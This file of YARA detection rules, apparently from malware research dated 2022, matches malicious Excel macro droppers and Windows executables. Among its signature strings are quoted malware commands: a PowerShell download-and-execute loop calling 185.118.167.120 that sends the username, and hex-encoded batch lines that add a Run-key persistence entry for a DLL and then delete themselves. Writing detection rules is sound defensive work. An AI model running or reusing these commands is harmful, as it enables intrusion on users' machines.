      $s12 = "ZVM1RGNubHdkRzluY21Gd2FIa3VRV1Z6VFdGdVlXZGxaQ0lOQ2lBZ0lDQWtZV1Z6VFdGdVlXZGxaQzVOYjJSbElEMGdXMU41YzNSbGJTNVRaV04xY21sMGVTNURjbmx3" ascii /* base64 encoded string 'eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZCINCiAgICAkYWVzTWFuYWdlZC5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5Dcnlw' */
      $s13 = "Ym1GblpXUWdQU0JEUVUxUERRb2dJQ0FnSkdoaGMyaGxjaUE5SUU1bGR5MVBZbXBsWTNRZ1UzbHpkR1Z0TGxObFkzVnlhWFI1TGtOeWVYQjBiMmR5WVhCb2VTNVRTRUV5" ascii /* base64 encoded string 'bmFnZWQgPSBDQU1PDQogICAgJGhhc2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEy' */
      $s14 = "SortConfig.conf" fullword wide
      $s15 = "\\.VirtualBoxer\\" fullword wide
      $s16 = "OwnDrive" fullword wide
      $s17 = ".VirtualBoxer.conf" fullword wide
      $s18 = "1 2<2x2" fullword ascii /* Goodware String - occured 2 times */
      $s19 = "_seh_filter_exe" fullword ascii /* Goodware String - occured 3 times */
      $s20 = "?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48_7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fcee_9 {
   meta:
      description = "data - from files 450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48.exe, 7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8.exe, f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285.exe"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48"
      hash2 = "7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8"
      hash3 = "f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285"
   strings:
      $s1 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s2 = ".data$rs" fullword ascii
      $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s4 = "vector too long" fullword ascii
      $s5 = "USERPROFILE" fullword wide /* Goodware String - occured 260 times */
      $s6 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" fullword ascii /* Goodware String - occured 903 times */
      $s7 = "  </trustInfo>" fullword ascii
      $s8 = "ndows\\C" fullword wide
      $s9 = "urrentVers" fullword wide
      $s10 = "SOFTWA" fullword wide
      $s11 = "      </requestedPrivileges>" fullword ascii
      $s12 = ".CRT$XIAC" fullword ascii /* Goodware String - occured 3 times */
      $s13 = "      <requestedPrivileges>" fullword ascii
      $s14 = "RE\\Mic" fullword wide
      $s15 = "oft\\Wi" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34_a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf67_10 {
   meta:
      description = "data - from files a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      hash2 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
      hash3 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      hash4 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
   strings:
      $s1 = "http://canarytokens.com/tags/traffic/images/azp6ai8pg5aq0c619ur0qzi6h/post.jsp" fullword wide
      $s2 = "\\Links\\gKN.vbs" fullword wide
      $s3 = "undll32." fullword ascii
      $s4 = "pircSW\") , \"*\"" fullword ascii
      $s5 = "rBCqOFioGz" fullword ascii
      $s6 = "qygdCjlSBv" fullword ascii
      $s7 = "TBJVqe/" fullword ascii
      $s8 = "SvPgjHM" fullword ascii
      $s9 = "*tfosorc" fullword ascii
      $s10 = "VtnerruC" fullword ascii
      $s11 = "aIrXkqcSN*nuR*noisreVtnerruC*swodniW*tfosorciM*erawtfoS*RESU_TNERRUC_YEKH" fullword wide
      $s12 = "Module1=26, 26, 1165, 453, Z" fullword ascii
      $s13 = "nDocumen" fullword ascii
      $s14 = "*swodniW" fullword ascii
      $s15 = "_B_var_JZSvPgjHMF" fullword ascii
      $s16 = "NERRUC_YhEKH" fullword ascii
      $s17 = "eLTmKkC" fullword ascii
      $s18 = "_B_var_YIpfAwF" fullword ascii
      $s19 = "YIpfAwF" fullword ascii
      $s20 = "kwiztVIv" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4_a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf67_11 {
   meta:
      description = "data - from files 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls, c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb, main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      hash2 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      hash3 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
      hash4 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      hash5 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
      hash6 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      hash7 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $s1 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s2 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s3 = "llehS*tpircSW" fullword wide
      $s4 = "RegWrite" fullword wide
      $s5 = "unction " fullword ascii
      $s6 = "        }" fullword ascii /* reversed goodware string '}        ' */
      $s7 = "Auto_Ope" fullword ascii
      $s8 = "Auto_Open" fullword ascii
      $s9 = "BuiltinDocumentProperties_" fullword ascii
      $s10 = "RegWrite!>" fullword ascii
      $s11 = "g.FileSy6s" fullword ascii
      $s12 = "orkbookG" fullword ascii
      $s13 = "PROFIL'" fullword ascii
      $s14 = "Auto_OpenV " fullword ascii
      $s15 = "teObject" fullword ascii
      $s16 = "ActiveWorkbook" fullword ascii
      $s17 = "Sheet1=0, 0, 0, 0, C" fullword ascii
      $s18 = "Picture 1" fullword wide
      $s19 = "Picture 2" fullword wide
      $s20 = "PROFIL" fullword wide /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf_63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e_12 {
   meta:
      description = "data - from files 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf.xls, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf"
      hash2 = "fff275f39ab9d6c282963f568dc62ca0c23456d9ccf22c8baedb23d3208b24fb"
      hash3 = "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
      hash4 = "3e6986d4dc7610c059aa8a51a61e30bcf509b7c2b5b4e931134c42384a0deea6"
   strings:
      $s1 = "MsgBox ('User and Password is correct.')'" fullword ascii
      $s2 = " 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 74 61 72 74$" fullword ascii /* hex encoded string 'ogramData\Exchange.dll,Start' */
      $s3 = "43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74$" fullword ascii /* hex encoded string 'C:\ProgramData\tt.bat' */
      $s4 = "52 45 47 20 41 44 44 20 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72" ascii /* hex encoded string 'REG ADD HKCU\Software\Microsoft\Windows\Cur' */
      $s5 = "70 6f 77 65 72 73 68 65 6c 6c 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 43 3a 5c 50 72" ascii /* hex encoded string 'powershell Start-Process rundll32.exe C:\Pr' */
      $s6 = "4b 65 72 6e 65 6c 33 32" fullword ascii /* hex encoded string 'Kernel32' */
      $s7 = "52 45 47 20 41 44 44 20 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72" ascii /* hex encoded string 'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v AutoStart /t REG_SZ /d "rundll32.exe C:\ProgramData\Exchange.dll,Start" && DEL "%~f0"' */
      $s8 = "43 41 4c 4c" fullword ascii /* hex encoded string 'CALL' */
      $s9 = "74 61 72 74 22 20 26 26 20 44 45 4c 20 22 25 7e 66 30 22$" fullword ascii /* hex encoded string 'tart" && DEL "%~f0"' */
      $s10 = "63 6d 64 2e 65 78 65 20 2f 63 20 73 74 61 72 74 20 2f 62 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 74 74 2e 62 61 74$" fullword ascii /* hex encoded string 'cmd.exe /c start /b C:\ProgramData\tt.bat' */
      $s11 = "43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c$" fullword ascii /* hex encoded string 'C:\ProgramData\Exchange.dll' */
      $s12 = "70 6f 77 65 72 73 68 65 6c 6c 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 43 3a 5c 50 72" ascii /* hex encoded string 'powershell Start-Process rundll32.exe C:\ProgramData\Exchange.dll,Start' */
      $s13 = "57 69 6e 45 78 65 63$" fullword ascii /* hex encoded string 'WinExec' */
      $s14 = "MsgBox ('Are you ok ?')" fullword ascii
      $s15 = "Sheet2 " fullword ascii
      $s16 = "{{}}(\"[]\", \"{^}\", \"JCCJ\", \"[*]\", 0)" fullword ascii
      $s17 = "MsgBox ('For ML, Yes,')" fullword ascii
      $s18 = "2 72 75 6e 64 6c 6c 33 32 2e 65 78 65 20 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 45 78 63 68 61 6e 67 65 2e 64 6c 6c 2c 53 " ascii
      $s19 = " 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e 20 2f 76 20 41 75 74 6f 53 74 61 72 74 20 2f 74 20 52 45 47 5f 53 5a 20 2f 64 20 2" ascii
      $s20 = "MsgBox ('My Application for Scalary')" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48_f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb_13 {
   meta:
      description = "data - from files 450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48.exe, f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285.exe"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48"
      hash2 = "f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285"
   strings:
      $s1 = "2'272G2W2g2w2" fullword ascii /* Goodware String - occured 1 times */
      $s2 = "7'777G7W7g7w7" fullword ascii /* Goodware String - occured 2 times */
      $s3 = "5'575G5W5g5w5" fullword ascii /* Goodware String - occured 2 times */
      $s4 = "6'676G6W6g6w6" fullword ascii /* Goodware String - occured 4 times */
      $s5 = "4'474G4W4g4w4" fullword ascii /* Goodware String - occured 4 times */
      $s6 = "?'?7?G?W?g?w?" fullword ascii /* Goodware String - occured 4 times */
      $s7 = "9'979G9W9g9w9" fullword ascii /* Goodware String - occured 4 times */
      $s8 = "1'171G1W1g1w1" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( all of them )
      ) or ( all of them )
}

rule _5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4_c13cb1c9277324534075f807a3fcd24d0d3c024197c7437bf65db78f6a_14 {
   meta:
      description = "data - from files 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4, c13cb1c9277324534075f807a3fcd24d0d3c024197c7437bf65db78f6a987f7a, c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb, main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      hash2 = "c13cb1c9277324534075f807a3fcd24d0d3c024197c7437bf65db78f6a987f7a"
      hash3 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      hash4 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $s1 = "<x:xmpmeta xmlns:x=\"adobe:ns:meta/\"><rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><rdf:Description rdf:ab" ascii
      $s2 = "></rdf:Description><rdf:Description rdf:about=\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elemen" ascii
      $s3 = "\"uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"/><rdf:Description rdf:about=\"uuid:f" ascii
      $s4 = "</dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>" fullword ascii
      $s5 = " /3/*2'*+*" fullword ascii /* hex encoded string '2' */
      $s6 = "**************************************************" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "d33d75182f1b" ascii
      $s8 = "\".\"%()+,+" fullword ascii
      $s9 = "' id='W5M0MpCehiHzreSzNTczkc9d'?>" fullword ascii /* Goodware String - occured 5 times */
      $s10 = "<?xpacket begin='" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x4b50 ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4_63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e_15 {
   meta:
      description = "data - from files 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf, 63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf.xls, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls, c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb, main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      hash2 = "63e404011aeabb964ce63f467be29d678d0576bddb72124d491ab5565e1044cf"
      hash3 = "fff275f39ab9d6c282963f568dc62ca0c23456d9ccf22c8baedb23d3208b24fb"
      hash4 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      hash5 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
      hash6 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      hash7 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
      hash8 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      hash9 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $s1 = "Module1" fullword wide
      $s2 = "_B_var_Environ" fullword ascii
      $s3 = "Module=Module1" fullword ascii
      $s4 = "Module1b" fullword ascii
      $s5 = "1Module1" fullword wide
      $s6 = "e = \"Mod" fullword ascii
      $s7 = "oft Shar" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec_5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea4_16 {
   meta:
      description = "data - from files 26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec, 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c.xls, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls, c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb, main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "26ed7e89b3c5058836252e0a8ed9ec6b58f5f82a2e543bc6a97b3fd17ae3e4ec"
      hash2 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      hash3 = "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
      hash4 = "3e6986d4dc7610c059aa8a51a61e30bcf509b7c2b5b4e931134c42384a0deea6"
      hash5 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      hash6 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
      hash7 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      hash8 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
      hash9 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      hash10 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $s1 = "C:\\Windows\\System32\\stdole2.tlb" fullword ascii
      $s2 = "VBE7.DLL" fullword ascii
      $s3 = "Scripting.FileSystemObject" fullword wide
      $s4 = "WriteLinee" fullword ascii
      $s5 = "Document=Sheet1/&H00000000" fullword ascii
      $s6 = "CreateTextFile" fullword wide
      $s7 = "*\\G{00" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c_a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278e_17 {
   meta:
      description = "data - from files a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c, a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "a69fee382cf86f9e457e0688932cbd00671d0d5218f8043f1ee385278ee19c8c"
      hash2 = "3e6986d4dc7610c059aa8a51a61e30bcf509b7c2b5b4e931134c42384a0deea6"
   strings:
      $s1 = "tMlpytEWRUil'" fullword ascii
      $s2 = "$*\\Rffff*04602bf40c" fullword wide
      $s3 = "*\\R1*#121" fullword wide
      $s4 = "*\\R1*#11c" fullword wide
      $s5 = "*\\R0*#9" fullword wide
      $s6 = "*\\R0*#1" fullword wide
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _42aa5a474abc9efd3289833eab9e72a560fee48765b94b605fac469739a515c1_5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea4_18 {
   meta:
      description = "data - from files 42aa5a474abc9efd3289833eab9e72a560fee48765b94b605fac469739a515c1, 5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34, a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34.xls, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d, b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls, c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb, main.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "42aa5a474abc9efd3289833eab9e72a560fee48765b94b605fac469739a515c1"
      hash2 = "5cdc7dd6162a8c791d50f5b2c5136d7ba3bf417104e6096bd4a2b76ea499a2f4"
      hash3 = "a8701fd6a5eb45e044f8bf150793f4189473dde46e0af8314652f6bf670c0a34"
      hash4 = "9e614ba0fe16b63913f535fe74ef84a8352bd52d3ef4cbde1ee6c8f8953915c3"
      hash5 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      hash6 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
      hash7 = "c9931382f844b61a002f83db1ae475953bbab449529be737df1eee8b3065f6eb"
      hash8 = "f45675f2a44f1c5a9eba95e85e5ea7defc15a54c6377746ba42cdfc6e4639b5a"
   strings:
      $x1 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s2 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s3 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s4 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s5 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
   condition:
      ( ( uint16(0) == 0x6f66 or uint16(0) == 0xcfd0 ) and filesize < 600KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

